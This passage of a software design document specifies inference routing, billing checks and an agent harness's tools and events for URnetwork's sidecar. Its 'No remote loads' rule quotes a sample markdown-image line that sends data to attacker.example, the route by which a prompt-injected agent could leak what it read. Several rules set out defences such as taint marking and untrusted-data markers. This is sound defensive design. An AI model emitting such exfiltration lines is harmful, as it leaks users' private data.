- **The nonce.** The device proposes it from the broker's clock, which every authorize answer carries; the broker refuses a nonce more than 1 second from its own clock or used under K_P in the last 15 seconds, so devices sharing K_P never collide and none can stockpile signatures for later. The device opens its TLS connection to the provider before it asks and measures its upload rate on it, and the direct path takes request bodies up to the 32 MiB the gateway takes (§8.7) that this rate delivers within 8 s, so a request arrives inside the window; a slow link that misses it retries with a new signature, the unused authorization released by step 4's lookup; a body the device's measured upload rate cannot deliver within 8 s, its images already at the model's input size (§8.5), is not sent: the call fails with `context_length`, which the gateway answers in each API's own overflow words and the Harness by compacting (§8.5, §7.4), so a long session shrinks rather than stops. G-PROV-engy asks engy to check a nonce when the headers arrive, which would lift this to the provider's own limit.
- **Retries, the lookup and the call's length.** Each authorization has its own hold. The broker signs a retry of a request only once the earlier nonce's window has passed and the provider's lookup answers it `unknown`, never served, which releases its hold; so a modified client is never served twice under one hold, and an honest retry never holds twice. The lookup answers one of three states, as N2 requires (§4.7): `unknown`, which a minute after the window releases the hold at no charge; `in progress`, which keeps it; and `finished`, with the usage, which settles it. A call lasts at most 9 minutes from its nonce: the device ends a stream then, and the provider bills what it served by its own rule (below), so the hash, kept 10 minutes at most, outlives every call, and its receipt is checked against it. While a provider's lookup fails, its calls' holds stay open, pending, neither charged nor released, and the broker signs no new call to that provider (`capacity`), so pending holds cannot pile up; they settle by nonce when it answers, the hash gone at 10 minutes as always, and one still pending after 24 hours is released at no charge, its cost, if the provider bills it, URnetwork's (§10.7). No unanswered hold becomes a charge (§9.7).
- **What the provider sees.** The conversation in plaintext, URnetwork's hotkey, an exit's address, a random `user` value and the run's cache salt; no field names the person, the device or the network, but the conversation may: the Harness's `ur://<net>/…` addresses carry the network's label, and agent and enclave names appear in it, so a provider that keeps conversations can link one network's runs (§2.8).
- **Cache salt.** The device puts a cache salt at the head of the system text here too, since every user shares URnetwork's account at the provider and engy bills cached input; but here the provider and its machines read it, so it is per run, not the member's: `HKDF-SHA256(K_sock, info "urnetwork-sidecar-v1/compute-cache-salt-direct" ‖ member_id ‖ run_id)`, a gateway call taking its session's id for the run's, so cache hits stay within a conversation and no value the device adds links one run to the next; a receipt that asks for a caller key gets a fresh one per request, so it marks no device.
- **A device that lies** about the model inside a body the broker cannot read is charged for the model the provider reports, never past that provider's costliest worst case, the exposure rule keeping its network within $5 of its floor, and is flagged. The broker compares the receipt's model with the ids the provider maps to the declared entry, its aliases and prefixed forms recorded at the gate (engy serves `deepseek-v4.1-flash` for `deepseek-v4.1-flash-1017` and ignores a leading vendor segment), since it cannot tell a device's lie from the provider's own substitution; a mismatch alarms, and after review, or at a second in 30 days, the network's direct calls are refused, never its enclaves or TEE calls (§9.11).
- **The receipt, checked on the device.** The device checks the provider's signed receipt too: its model must be one the policy's `models` map gives the entry, and where the map requires zero retention, engy's `served.zdr` must be true, which engy sets only if every machine that received the prompt, retries included, keeps no data. A receipt that fails ends the run's use of that model, `model_refused` naming the receipt, and the device reports it with the request id (6.7); a provider whose receipts fail in more than 0.5% of a day's calls is taken out of the catalog until reviewed.
- **A stream closed early** is billed as the provider bills it: engy charges nothing, SayGM the whole generation.
- **The disclosure.** The first call to a provider here waits for the person's acknowledgment, or on a tagged or cloud sidecar an Owner's or Admin's for the network (§2.8, 6.4); until then nothing reaches the broker or the provider, and a run no person is attached to gets `disclosure_required`. A new version of the disclosure asks again, the previous acknowledgment carrying calls through its grace (§2.8).
- **Errors.** A model the floor or the provider list refuses is `model_refused`, naming the rule. A missed window means the device asks again with a new nonce, which the broker signs once the earlier one is `unknown`, releasing its hold (above). A provider whose lookup fails, or whose account cannot cover the hold (§10.4), is `capacity`, with a retry time; open holds in the way are `held`, as on the TEE path.

### 6.7 Checking the charge

The provider's TEE answers inside the ciphertext with the usage it served (the Chat Completions `usage` object), which only the device can read and which the broker cannot alter. The broker charges from the provider's clear usage (§9.7). The device compares the two and, on a difference over 2% or 50 tokens, raises `charge_mismatch` in `ur status` and the apps and reports the request id to `POST /v1/infer/dispute`, which holds the charge for review (§10.7). On the direct path the device compares the charge with the usage the provider returned to it in the clear.

A dispute is a claim only the device can check, so disputes alone never change the catalog: the broker counts a provider's disputes by network, each network counting at most 10 a day, and when disputes from at least 3 networks pass 0.5% of the provider's requests in a UTC day, it pages a person, who reviews the held charges and the canary's results before any change to the catalog (§4.7). A few modified clients therefore cannot remove the only remote provider. The comparison also catches only a broker that inflates the provider's numbers, since both numbers are the provider's; a provider that overcounts is caught by `compute_canary` (§14.5): hourly, a sidecar of URnetwork's own, in a network of its own, calls each provider's catalog models with a fixed prompt whose input tokens the model's tokenizer counts and a task that writes exactly its `max_tokens`, and compares the provider's usage, the charge and the provider's bill (§10.7) with the known counts; a gap over 2% pages and opens §10.7's review.

### 6.8 The record

Each call, from the Harness or the gateway, is a `model_call` entry in its run (RECORD.md section 12's `ModelCallBody`) with the charge as `reported_micro_usd`, and for a TEE call the `AttestationResult` (§5.8) in a new field; a direct call records `route: "direct"`, the label `none` and the provider's usage, with no attestation. RECORD.md's reserved evidence level 4, `attested`, goes on a new `platform` field, naming the policy profile the TEE booted, only when §5 passed for that call; the model's name stays at level 2, `reported`, since no provider's evidence covers the serving code or the weights (§4.5) and D-RECORD-11 forbids presenting weaker evidence as attested. The receipt reads "attested platform (AP: Chutes trusted), model as the provider names it".

```proto
message ModelCallBody {                     // RECORD.md section 12, extended
  // fields 1-10 as RECORD.md
  AttestationResult attestation = 11;       // remote calls only
  string route = 12;                        // "local" | "tee" | "direct"
  uint64 catalog_version = 13;
  ModelField platform = 14;                 // evidence 4: the policy profile verified; the model stays evidence 2
  CallContext context = 15;                 // the call's place in the run's session tree (§24.5)
}
```

### 6.9 Alternatives considered

| Option | Pros | Cons | Verdict |
|---|---|---|---|
| Link LiteRT-LM into `ur` with cgo | one process | breaks the no-cgo build, the wasm leg and cross-compiles; an engine crash takes the daemon | rejected |
| llama.cpp through yzma (Go, no cgo) on desktops | mature, no cgo | CO-1 names LiteRT-LM; no mobile support | the desktop fallback if a LiteRT-LM release regresses (Q-INFER-2) |
| Apple Foundation Models / Android AICore | on the OS | 4,096-token context (Apple); Kotlin-only and foreground-only (AICore); not LiteRT-LM | not used; LiteRT-LM's adapter to Apple's interface is an option later |
| The device calls a TEE provider directly | no broker hop | URnetwork's key would sit on devices, which Chutes' §3.3 forbids | rejected for the TEE path; the direct path does it with a per-request signature, through the egress, for providers that take btauth/1 (6.6) |
| The broker calls a provider without a TEE with URnetwork's key | the simplest path to any API | the broker would read every prompt | ruled out by the directive |
| Count tokens on the device for the bill | no provider trust | a tokenizer per model on every device; the provider's count is what URnetwork pays | the device checks, the provider's count bills (D-BAL-3) |
| Anonymous metering: blind-signed tokens bought in batches and spent per call, as Apple's Private Cloud Compute does, so the broker cannot link a call to a network | removes compute-1's who | per-subject budgets and per-request charges (CO-3) need attribution; variable-cost calls need cost tokens refunded later | Later |

### 6.10 Decisions proposed

**D-INFER-1 (proposed).** One catalog, one router, used by the Harness and the gateway; one namespace of canonical names, `<provider>-<model>-<effort>` (6.3), no name claiming what its label denies and no two alike, beside the search endpoints' `search/<engine>/<kind>` (§21). *Why:* CO-11, CO-18.

**D-INFER-2 (proposed).** The engine runs out of process on desktops, in `ur-engine`, a separate executable (purego, no cgo) that holds no keys, no network and no app group and that the OS confines to its engine and model files, and in the app's own runtime on phones, behind `SidecarLocalInferenceHost`. *Why:* no cgo; crash isolation; a C++ parser of model files and untrusted text must not run with the daemon's keys, and on macOS only a separate executable can load Google's libraries while `ur` keeps library validation; iOS forbids downloaded code.

**D-INFER-3 (proposed).** TEE calls go device → broker → provider with the provider's own E2E envelope; the device reads the instance list and evidence over its own TLS and takes only the E2E keys from the broker. *Why:* R-INFER-3, R-INFER-5, Chutes §3.3; the broker must not choose the machine.

**D-INFER-4 (proposed).** RECORD.md's evidence level 4 is written on the `platform` field of a verified remote call; the model's name stays level 2. *Why:* §4.5; RECORD.md's D-RECORD-11 forbids presenting weaker evidence as attested.

**D-INFER-5 (proposed).** Calls to models without a TEE take the direct path: the broker signs btauth/1 over the request's hash, for a host and receiver the policy pins, and keeps the hash only until the call settles, the device builds the request from the policy's `models` map alone (the provider's id, zero-retention rule and upstreams), checks each receipt against it and sends the request through `auto` egress, and the provider's per-request usage is the bill. *Why:* CO-18 under the directive; an unsigned catalog must not decide who reads a prompt.

**D-INFER-6 (proposed).** The router calls a model labeled `none` only once the person has acknowledged its provider's disclosure at its current version, asking where the person is attached and otherwise answering `disclosure_required`; one check at the router covers a first pick, `SetModel`, the failure choice, continuations, forks, children and gateway calls. Local and TEE models are not asked. *Why:* CO-34; Q-MAILCAL-5.

**D-INFER-7 (proposed).** A local entry carries the label `local`, which every floor, provider list and `tee_only` admit, and the router checks a local call against the person's `allow` alone, so it runs in every state of the balance and past every budget; agents read the catalog through `models_list`, a name no signed source carries reaching them only between untrusted-data markers; `agent_launch` checks a child's model as the router will, a `none` provider's disclosure included, before the child starts; and the person's `models` key is written only by their own act, `ur models set` on /dev/tty or `Models().SetSettings` in an app's UI. *Why:* CO-9, CO-11, CO-18, CO-34; only the person chooses which inference may read their words (§16.4); a breached broker must not write into an agent's context.

### 6.11 Questions

**Q-INFER-1.** Does a local model that fails or lacks memory fall back to a remote one? *Options:* (a) never on its own; (b) automatically. *Answer:* (a). Local is free and private; remote costs money and leaves the device. The Harness offers the switch and the person chooses (CO-9, CO-11). *Decider:* owner.

**Q-INFER-2.** What if a LiteRT-LM release breaks a platform? *Options:* (a) pin the last good version per platform in the manifest; (b) a second engine. *Answer:* (a), with llama.cpp through yzma as a desktop-only fallback engine behind the same interface if a regression outlasts one release cycle. *Decider:* peer review.

**Q-INFER-3.** Is the cache salt per network, per member or per run? *Answer:* per member on the TEE path: it blocks other customers of the provider and other members of a Team alike, while a member's own runs keep their cache hits; per run on the direct path, whose provider reads the salt in plaintext, where a member's salt would link all of that member's conversations. On the TEE path only Chutes' code inside the boundary reads the salt, and AP already trusts it with the plaintext, so the link it gives Chutes is disclosed (§2.8) rather than paid for in cache misses. *Decider:* peer review.

**Q-INFER-4.** Embeddings? *Answer:* Later. No TEE provider offers embedding models (Chutes' catalog had none on 2026-11-23); DESIGN's search runs without them. *Decider:* peer review.

**Q-INFER-5.** When a canonical name carries an effort and the request asks for another, which wins? *Answer:* the name: it is the person's choice in a harness's settings, so Codex's and Claude Code's own effort settings change nothing for a full name; a request names the alias without the effort to let its own parameter decide (6.3). *Decider:* peer review.

**Q-INFER-6.** Should a name let URnetwork pick the provider, as `any-<model>-<effort>` routed to the cheapest allowed one? *Answer:* not at launch: CO-18 puts the provider in the name, so the person always knows who serves a model; an `any` provider is Later, and would choose only among providers the person's floor and list allow. *Decider:* owner.

**Q-INFER-7.** One disclosure per provider, or one per model? *Options:* (a) per provider, its text naming any model whose exposure differs; (b) per model. *Answer:* (a). The exposure follows the provider and its label: who reads a request, under which terms; and one acknowledgment per provider keeps the prompts few. Where a model differs, the provider's text says so, as engy's names its one model without zero-retention workers and SayGM's points to the upstream the signed policy names for each model; a provider whose models differ more gets an id per group. *Decider:* peer review.

### 6.12 Risks

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| Small local models handle tools poorly | high | agents fail locally | catalog notes; the person picks; remote models for tool-heavy work |
| Engine downloads are large (50-85 MB plus 2.6-16 GB models) | certain | first use is slow | download on first pick, resumable, with progress; never at install |
| A notarized macOS build cannot load the engine's libraries under library validation | medium | no local models on macOS | `ur-engine` alone takes the exception, sandboxed and holding nothing (6.5); M11's exit loads them from a notarized build (§19) |
| Chutes changes its E2E format | medium | remote calls fail closed | the adapter's version check; conformance tests per provider release (§18) |
| A provider's usage overcounts | low | overcharge | 6.7's check and disputes, which page a person; the canary's known counts (6.7) |

## 7. The Harness

### 7.1 Purpose and scope

This section designs the Harness: the agent harness embedded in sidecar that takes prompts and emits typed events (CO-1), launches agents on any catalog model (CO-11), runs with the local tool profile on a person's device (CO-6) and the full profile in an enclave (CO-5), records its runs natively, starts every agent with the recURd skill (CO-12, §20), and attaches to another Harness, in an enclave, over the bundled SSH (CO-5), to drive one session or to manage every agent there (CO-23). Models come from §6, enclave control from §11, SSH from §12, git from §13.

### 7.2 Requirements

| Id | Requirement | Source |
|---|---|---|
| R-HARN-1 | A `Harness` instance in the sidecar core, on the CLI, sdk and (later) wasm legs | CO-1 |
| R-HARN-2 | Output is a typed event stream; apps render components, the CLI renders terminal text, from the same events | CO-1 |
| R-HARN-3 | Any agent may use any catalog model it is allowed, and may launch agents that use any | CO-11 |
| R-HARN-4 | Local profile: bundled tools and a temp workspace only; no shell, no host files, no host processes | CO-6 |
| R-HARN-5 | Enclave profile: full Debian tools; the agent writes and runs programs | CO-5 |
| R-HARN-6 | A local Harness attaches to an enclave's Harness and drives it | CO-5 |
| R-HARN-7 | Every agent starts with the recURd skill | CO-12 |
| R-HARN-8 | Runs are recorded with full coverage, outward tools pass the approval gate, and untrusted input taints | DESIGN §2.9 I-7 to I-9, §16 |
| R-HARN-9 | A local Harness manages the remote Harnesses its person may reach: it lists their agents and launches, prompts, steers, waits on and stops any of them, and both sides know the messaging between them, live over the link and by inbox thread | CO-23 |

### 7.3 PiG, and what is taken from it

PiG (github.com/MichaelKinsy/PiG, MIT, `main` at 40b509fb, 2026-11-18) is a Go port of Mario Zechner's Pi coding agent (earendil-works/pi, formerly badlogic/pi-mono) pinned to Pi 1.5.0, aiming at byte-level parity ([Rpt:bb] pig_harness.md). Its agent loop is the right model: prompt, continue, steer, follow-up, abort, subscribe and wait-for-idle; parallel tool batches with ordered persistence; before- and after-tool hooks; compaction and retries; a typed event union; a JSON-lines RPC mode; sessions as a JSONL tree of entries. Embedding it is not:

| Finding | Consequence |
|---|---|
| ~1.04M lines of non-test Go in 3,990 files; one release was retracted for exceeding Go's module size limit; a headless embed is 30-37 MB | far past DESIGN §18.10's size budgets for the apps |
| `agent` + `ai` do not compile for `GOOS=js` or `wasip1` (functions defined only in unix and windows files) | breaks the browser leg |
| Importing `agent` rewrites `http.DefaultTransport`'s TLS settings in an `init()`; provider and key registries are package globals | unsafe in a process that holds sidecar's transports and keys |
| Built-in tools shell out to bash, `rg` and `fd`; their file operations cannot be replaced from outside the module | CO-6 forbids host processes |
| Pre-stable; v0.5.3 and v0.7.0 broke its Go API; one author wrote 210 of the last 227 commits | a dependency that moves under us |

So the Harness is sidecar's own code, `harness_*.go`, modeled on Pi's agent core, and it reuses Pi's three formats unchanged where they fit: the event JSON (`agent_start` … `tool_execution_end`), the RPC protocol of Pi 1.5.0, and the session entry tree (JSONL version 3). Small parts may be adapted from PiG's `agent` package under its MIT license, with attribution in `third_party/`. Enclaves ship PiG itself, pinned, as an alternative harness (7.10), and because the formats match, the local Harness attaches to either.

### 7.4 The loop

```go
// harness.go; every leg but the VPN component's
type Harness struct { /* one per sidecar host; holds agents, the router, the recorder */ }
func (self *Harness) NewAgent(ctx context.Context, spec *HarnessAgentSpec) (*HarnessAgent, error)
type HarnessAgentSpec struct {
	Name     string            // §20.5; registered at start
	Model    string            // a canonical name (§6.3)
	Profile  string            // "local" | "enclave"
	Tools    []string          // a subset of the profile's tools; empty: all
	Parent   *Id               // the launching agent, for sub-agents (7.9)
	Budget   *HarnessBudget    // USD per day, per month and per run (§16.4)
	Instructions string        // after the recURd skill and before the person's prompt
}
type HarnessAgent interface {
	Prompt(ctx context.Context, text string, images [][]byte) error // refused while running: use Steer or FollowUp
	Steer(text string)        // delivered after the current turn, before the next model request
	FollowUp(text string)     // delivered when the agent has no more work, before the run ends
	Abort()                   // ends the turn; the stop reason is "aborted"
	WaitForIdle(ctx context.Context) error
	Subscribe(listener func(*HarnessEvent)) (unsubscribe func())
	SetModel(model string) error
	Compact(ctx context.Context, instructions string) error
}
```

| Behavior | Value (Pi's defaults unless noted) |
|---|---|
| Turn | stream one assistant response; run its tool calls; poll steering; when no calls remain, poll follow-ups |
| Tools | parallel by default; a tool marked sequential makes its batch sequential; `tool_execution_start` in call order, ends as tools settle; file writes ordered by a mutation queue |
| Length stop | a response cut by length fails every tool call it carries, since their arguments may be truncated |
| Compaction | when context > window - r, r being 16,384 tokens or a quarter of the window, whichever is less, or a provider refuses a request as too large; keeps the last 20,000 tokens or a quarter of the window, whichever is less, so a 32k-token phone model compacts at 24,576 and keeps 8,192; never splits a call from its result |
| Tool budget | (ours) a request's tool schemas and the skill take at most a quarter of the model's window (§6.3): an agent whose spec names no tools gets the profile's set where it fits, and otherwise the small set: `read`, `write`, `edit`, `ls`, `grep`, `git`, `evs_read`, `evs_list`, `web_search`, `web_fetch`, `agent_register`, `agent_summary`, `agent_send` and `agent_inbox`; a spec or `agent_launch` that names more than the budget holds is refused |
| Retry | 3 tries, 2 s base, only on retryable errors (capacity, transport); never to another model (R-INFER-3) |
| Max turns | 100 per prompt (Pi: unlimited), settable per agent; the cap ends the run with a `max_turns` stop |
| Model failure | an error names the model and code; the Harness offers "retry", "another model" and "local" as an `ui_request` (7.6), and the person picks; for `insufficient_quota` (§6.6) it also offers "add credit" where the balance ran out, to a person who may buy (§9.10: the apps' purchase sheet, `ur compute buy`), else naming who may, and "raise the budget" where the agent's budget ran out, which files `compute_budget_raise` (kind 21, §16.3) for the person to approve; for its reason `held` it offers nothing, and retries at the time the broker gives, at most 3 times, before it reports the error |

### 7.5 Tools

```go
type HarnessTool interface {
	Name() string
	Description() string
	Schema() []byte                 // JSON schema of the arguments
	Mode() string                   // parallel | sequential
	Tier() string                   // R | W | O (DESIGN §16.5)
	Execute(ctx context.Context, callId string, args []byte, update func(*HarnessToolUpdate)) (*HarnessToolResult, error)
}
type HarnessToolResult struct {
	Text    string                  // what the model reads
	Details []byte                  // structured JSON for the UI: a diff, a terminal transcript, a file listing
	Trust   string                  // trusted | untrusted (7.8)
}
```

| Tool | Local | Enclave | Tier | What it does |
|---|---|---|---|---|
| `read`, `write`, `edit`, `ls`, `grep`, `find` | in the workspace only | in the agents' container's file system, which the Harness, outside it, opens beneath the container's root (`openat2` with `RESOLVE_IN_ROOT`), so a link an agent planted resolves inside it (§11.10) | R; W; in the enclave profile every result untrusted (7.8) | Pi's file tools, same names and arguments, since models are trained on them; local paths resolve inside the workspace root and refuse `..`, symlinks out, absolute host paths and any `.git` component, in every spelling git itself refuses (case, Unicode folding, NTFS's `git~1`), so only `git` writes a worktree's git directory (§13.7) |
| `bash` | **no** | yes, as root in the agents' container (§11.10) | W | runs a command with a timeout (10 min) and output caps (256 KiB a stream) |
| `git` | yes (§13) | the system git and `ur git`, run in the agents' container, their pushes and fetches carried to the local tier over the tool call's own pipe (§11.10) | W; never under an inbox (§20.4); a fetch that takes a push of untrusted provenance taints the run before the worktree is written (7.8, §13.6) | one argv-style tool |
| `evs_*`, `search`, `record_query`, `record_append` | yes | yes, over what the sponsor's devices read (CO-43); a read of the mailbox, a vault file or a marked node gives the run the `private` mark (7.8) | DESIGN §16.5's tiers | as the MCP tools of the same names, in process; `record_query` lets an agent review other agents' runs within its reach (CO-19) |
| `agent_*` (§20.10) | yes | yes | R; W; O (kind 24) for a tainted run's sends (7.8) | the recURd skill's tools |
| `agent_launch`, `agent_prompt`, `agent_wait`, `agent_stop` | yes | yes | W; `agent_wait` R; O (kind 24) for `agent_launch` and `agent_prompt` in a tainted run into an enclave whose egress is not `none`, and for `agent_prompt` to another member's agent (7.8); `agent_launch` never into another member's enclave (7.10) | sub-agents (7.9), and any agent of a remote Harness the person may reach (7.10); taint follows the work between parent and child (7.9) |
| `harness_list` | yes | yes, for enclaves a rule lets it reach (Q-HARN-9) | R | the person's enclaves, their Harnesses and agents (7.10) |
| `harness_continue(run, at?, enclave)` | yes | no | W, after the person's confirmation in the app or on `/dev/tty`, never an RPC `ui_response`; O (kind 24) when the enclave reaches out (7.8) and the calling run is tainted or a node it continues is flagged or untrusted, which the enclave's daemon would otherwise hold from its container (7.8) | continues a run of the member's in their enclave, which reads it from the vault as any of their devices does (§24.7), sent as `ur_continue` (7.10) |
| `enclave_list`, `enclave_create`, `enclave_stop`, `enclave_start`, `enclave_delete` | yes | no (an enclave makes no enclaves) | R; O for create, start and delete, a tool's start being a kind 19 whatever it changes, and a create's or start's admission and a delete's removal running on the approving device (§11.7); `enclave_stop` W, and in a tainted run only after the person's confirmation in the app or on `/dev/tty`, never an RPC `ui_response`; none of them stops, starts or removes the network's indexer enclave, which only the person's own act does (§11.11, Q-ENC-12) | §11 |
| `ssh_exec` | yes, to enclaves the policy lets it reach | yes | W; O (kind 24) in a tainted run when the target's egress is not `none` or it is another member's (7.8) | §12: one command, structured stdout, stderr and exit code |
| `compute_balance` | yes | yes | R | this agent's budget left and whether the network can pay (§9.9's state), as MCP's (§15.2); never the network's balance, which only §9.10's roles see |
| `compute_budget_raise(period, amount, reason)` | yes | yes | O (kind 21) | asks the person to raise this agent's budget for the day, month or run, the agent waiting on `approval_pending` (§16.3); the approved raise reaches the broker as `POST compute/v1/budget/raise` (§14.3) |
| `models_list(filter?)` | yes | yes, the enclave's catalog under its sponsor's rules (§11.4) | R | the models this agent may use (§6.3): each canonical name with its label, provider, efforts, context window, tools, prices and whether its disclosure is acknowledged; a name the signed policy or the release's manifest carries as plain text, any other only within §6.3's grammar and 96 characters, between untrusted-data markers, as §9.13 shows labels, tainting nothing |
| `compute_spend` | on its person's consented device only (§9.10) | no | R; labels per §9.13, unsigned ones between untrusted-data markers | where credits went (§9.13): each service's total and last 7 days, net of refunds, by provider and model, enclave or member, and the 7 days by agent too, within its person's role (§9.10), named on the device; never charge rows, lots or payment methods (CO-22) |
| `web_search` | yes | yes (M14) | R; untrusted result | §21: Parallel's Search, called from the device through URnetwork's network and paid per search, each search a charge on the compute balance, after the person's disclosure (§21.6) |
| `web_fetch` | yes (§22) | yes (M14), under the enclave's egress | R; in the local profile, O (kind 23) for a URL composed in a tainted run (§22.5); untrusted result | §22: one page in a structured form, through URnetwork's network |
| `listeners_list` | yes (§26.9) | yes, `reachable_only` always: what the enclave may reach | R; other devices' words as short tokens between untrusted-data markers, capped, no taint; their free text only with `untrusted: include`, which taints first (§26.9) | the network's listed services as `ip:port (description)`, each with this device's reach and its list's age |
| `mail_list`, `mail_read` | yes (§23.4) | yes, the sponsor's mailbox (CO-42, CO-43), each read giving the run the `private` mark (7.8) | R; outside mail taints | DESIGN §16.5's tools in process: the person's unread mail and its messages; nothing they read is marked seen |
| `calendar_list`, `calendar_add`, `calendar_update`, `calendar_delete` | yes (§23.8) | yes, the sponsor's links, which the enclave's daemon reads outside the agents' container (§23.6), with the `private` mark (7.8) | `calendar_list` R, untrusted result; the writes W, or O (kind 25) in a tainted run or for events with attendees | the person's linked calendars through URnetwork's network, with a link the tool reads and the agent never sees |
| `connections_list` | yes (§25.9) | yes, with the `private` mark (7.8) | R | the person's connections and the services that can be connected; never a token |
| `connection_request` | yes | no | R; only the person answers, on their own device (§25.5) | asks the person to connect a service or add a feature |
| `service_call` | yes (§25.9) | yes, the daemon attaching the token outside the agents' container (§25.6), with the `private` mark (7.8) | reads R, untrusted result; writes and sends W in an untainted run (CO-40) and O (kind 26) in a tainted one, the safety classifier deciding a write first (§25.10, §27.4) | one HTTPS call to a connection's API hosts; the daemon attaches the token, which the agent never sees |

**The workspace.** Each local agent gets a temp directory: the OS temp dir on desktops, the app's cache directory on phones, memory (with an OPFS spill, later) in the browser. Caps: 1 GiB desktop, 256 MiB phone, 64 MiB browser, counted across the agent's files and `git` worktrees. It is removed when the run ends; anything kept goes to EVS, through `git push` or `evs_write` (CO-6: "uses our EVS/git for file storage"). Nothing in the local profile opens a path outside it, starts a process, or opens a socket other than the sidecar's own transports.

### 7.6 Events and the UI

The events are Pi's, so a component that renders a Pi or PiG session renders the Harness's, with sidecar's additions after them. Every event is JSON with `type`, the agent's `agent` id and a per-agent `seq`; one relayed from a remote Harness also names its `enclave` (7.10).

| Event | From | Fields that matter | App component |
|---|---|---|---|
| `agent_start`, `agent_end`, `agent_settled` | Pi | stop reason; `will_retry` | the run's status line |
| `turn_start`, `turn_end` | Pi | turn number | — |
| `message_start`, `message_update`, `message_end` | Pi | role; `assistantMessageEvent` deltas (text, thinking, tool call); `message_end` is authoritative | message bubble (markdown, streaming); a collapsible thinking block |
| `tool_execution_start`, `tool_execution_update`, `tool_execution_end` | Pi | tool, call id, args, partial and final result, `details` | tool card; `details` picks the view: a diff for `edit`, `write` and `git diff`, a terminal for `bash` and `ssh_exec`, a file list for `ls` and `find`, a results list with links for `web_search` (§21.6), a reader view for `web_fetch` (§22.3), a message list for `mail_list` and an agenda for `calendar_list` (§23.11), and the Listeners section's rows for `listeners_list` (§26.9) |
| `queue_update` | Pi | steering and follow-up queues | "queued" chips under the input |
| `compaction_start`, `compaction_end`, `auto_retry_start`, `auto_retry_end` | Pi | reason, tokens | a status note |
| `approval_pending`, `approval_resolved` | sidecar | the action's canonical text, evidence wanted (DESIGN §16.6); for an automatic decision, `auto`, its reason and score (§27.9) | an approval card on this device; the request also reaches the person's other approval-capable devices; one relayed from a remote Harness renders only from the approval log's entry (DESIGN §16.6), never from the event; an automatic decision as a note in the run, "approved automatically by this device's check", never as the person's approval (§27.9) |
| `attestation` | sidecar | `AttestationResult` (§5.8), or for a model without a TEE its label alone | a badge on each message: provider and label (AP: "provider trusted"; `none`: "not in a TEE: the provider can read this"), with the TEE's profile; and the provider's disclosure line, which opens its text (§2.8) |
| `usage` | sidecar | tokens and the charge for the call; the run's total | the cost meter |
| `agent_spawned`, `agent_exited` | sidecar | child agent, name, model, where (local or `enclave:<name>`) | an agent tree |
| `thread_message` | sidecar | §20.7's message, its sender and trust | the threads view, with a reply box |
| `mail_summary` | sidecar | after a turn whose tools read mail: the messages read and the assistant message that closes the turn (§23.11) | the mail-summary card, each message linked, with "Mark these read" |
| `calendar_event` | sidecar | one event read, proposed, waiting, written or declined, with its state and source message (§23.11) | an event card, with Undo or, for a proposal, the phone's add sheet |
| `connection` | sidecar | a connection made, a feature added, rejected, replaced or removed, or an agent's request waiting: its label, service, account, features and state; never a token (§25.11) | the Connected services screen's row; in the bot tab, the request's card, or Reconnect where rejected |
| `enclave_status` | sidecar | an enclave's state, with why it stopped or failed (the person, a run, named, the balance, the provider, attestation) and whether it is unreachable (§11.11), its role, address, label and cost (§11.6, §9.9) | the enclave card, with its provider's disclosure line (§2.8) |
| `attach_status` | sidecar | attached, detached, reconnecting, with the remote Harness's name and the link's mode: one session, or the whole Harness (7.10) | the remote session's header |
| `ui_request`, `ui_response` | Pi's `extension_ui_request` | select, confirm, input; the model-failure choice (7.4); `connect`, an agent's request to connect a service or to use a connection on this device (§25.7), which only the person's own input answers (§25.5); `disclosure`, naming an id and version alone (§2.8) | a dialog; one relayed from a remote Harness is labeled with its enclave and agent, and only a `select` or `confirm` among choices the local Harness knows (7.4's) is relayed, a remote `input` refused (7.10); a `disclosure` shows the signed policy's text for its id and version, never text the event carries, and only the person's acknowledgment answers it (`AckDisclosure` from the app's UI, or `ur harness` reading /dev/tty), never a `ui_response`, which may only decline it ("Not now"), failing the call that waits on it; one from a remote Harness is relayed by id and version alone, and the enclave reads the sponsor's acknowledgment from the vault (§11.4) |

**Disclosure lines.** Every search card, every model's badge, in the picker and on each assistant message, every enclave card, kind 19's approval card, and each connection's row and kind-26 card carries its disclosure's summary line, which opens the full text; the renderer takes both from the signed policy by id (§2.8), so no model, tool, remote Harness or server can change what the person reads.

**No remote loads.** A renderer never fetches anything that model or tool output names: no remote image, no link preview or unfurl, no prefetch; an image is shown as a link the person may open, and the terminal emits no inline-image escapes. Otherwise a tainted run could leak what it read by writing `![](https://attacker.example/?d=…)`, past every fetch rule (§22.5).

**Delivery.** The sdk passes each event as a JSON string to a gomobile listener (`SidecarHarnessListener.OnEvent(json)`); the CLI renders them (7.11) or prints them raw with `ur harness --json`; RPC mode writes them as JSON lines (7.10). Text deltas are batched to at most 30 events a second per agent, so a phone's UI thread is not flooded; `message_end` carries the whole message, so a dropped update loses nothing.
